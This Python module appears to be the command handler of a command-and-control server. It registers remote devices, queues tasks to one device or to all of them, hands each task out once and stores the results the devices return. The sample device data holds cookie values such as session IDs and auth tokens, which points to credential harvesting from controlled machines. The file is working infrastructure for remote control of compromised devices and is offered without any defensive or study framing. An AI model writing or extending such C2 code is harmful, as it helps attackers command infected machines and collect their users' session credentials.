"""
Command handler for the C2 server.
Manages server-side state: devices, configuration, pending tasks, and results.
"""

import logging
from collections import defaultdict
from datetime import datetime, timezone
from typing import Any
from uuid import uuid4

from models import DeviceInfo, ServerConfig, TaskResponse

logger = logging.getLogger("c2-server.handler")


class CommandHandler:
    """Manages server-side state for devices, configuration, tasks and results."""

    def __init__(self) -> None:
        self.server_config = ServerConfig()
        self.devices: dict[str, DeviceInfo] = {}
        self.task_queues: dict[str, list[TaskResponse]] = defaultdict(list)
        # Maps task_id -> task_type for result storage lookup.
        self.task_registry: dict[str, str] = {}

    def _seed_sample_devices(self) -> None:
        """Populate the device registry with sample data. Used by tests and demos."""
        samples = [
            DeviceInfo(
                name="device-alpha",
                ip="192.168.1.10",
                status="online",
                cookies={"session_id": "abc123def456", "auth_token": "tok_7890xyz"},
            ),
            DeviceInfo(
                name="device-beta",
                ip="192.168.1.20",
                status="online",
                cookies={"tracking_id": "trk_001"},
            ),
            DeviceInfo(
                name="device-gamma",
                ip="192.168.1.30",
                status="offline",
                cookies={},
            ),
        ]
        for device in samples:
            self.devices[device.name] = device

    def register_device(self, device: DeviceInfo) -> None:
        """Register or update a device in the registry."""
        device.last_seen = datetime.now(timezone.utc)
        self.devices[device.name] = device
        logger.info("Device registered/updated: %s (%s)", device.name, device.ip)

    def get_device(self, name: str) -> DeviceInfo | None:
        """Look up a device by name."""
        return self.devices.get(name)

    # -----------------------------------------------------------------------
    # Task queue management
    # -----------------------------------------------------------------------

    def queue_task(
        self,
        device_name: str,
        task_type: str,
        parameters: dict[str, Any] | None = None,
    ) -> TaskResponse:
        """Queue a task for a specific device."""
        task = TaskResponse(
            task_id=str(uuid4()),
            task_type=task_type,
            parameters=parameters or {},
        )
        self.task_queues[device_name].append(task)
        self.task_registry[task.task_id] = task_type
        logger.info(
            "Task queued for %s: type=%s, id=%s",
            device_name,
            task_type,
            task.task_id,
        )
        return task

    def queue_task_for_all(
        self,
        task_type: str,
        parameters: dict[str, Any] | None = None,
    ) -> list[TaskResponse]:
        """Queue a task for ALL registered devices."""
        tasks = []
        for device_name in self.devices:
            task = self.queue_task(device_name, task_type, parameters)
            tasks.append(task)
        return tasks

    def dequeue_tasks(self, device_name: str) -> list[TaskResponse]:
        """Retrieve and remove all pending tasks for a device (fire-once)."""
        tasks = self.task_queues.pop(device_name, [])
        if tasks:
            logger.info("Dequeued %d task(s) for %s", len(tasks), device_name)
        return tasks

    def pending_task_count(self, device_name: str) -> int:
        """Return the number of pending tasks for a device."""
        return len(self.task_queues.get(device_name, []))

    def all_pending_tasks(self) -> dict[str, int]:
        """Return a summary of pending tasks per device."""
        return {name: len(tasks) for name, tasks in self.task_queues.items() if tasks}

    # -----------------------------------------------------------------------
    # Result storage
    # -----------------------------------------------------------------------

    def store_result(
        self,
        task_id: str,
        device_name: str,
        data: dict[str, Any],
        success: bool,
    ) -> None:
        """Persist a task result on the device, keyed by task_type."""
        device = self.devices.get(device_name)
        if device is None:
            logger.warning("store_result: unknown device '%s'", device_name)
            return

        task_type = self.task_registry.pop(task_id, "unknown")
        device.results[task_type] = {
            "task_id": task_id,
            "data": data,
            "success": success,
            "received_at": datetime.now(timezone.utc).isoformat(),
        }
        logger.info(
            "Result stored: device=%s task_type=%s task_id=%s",
            device_name,
            task_type,
            task_id,
        )
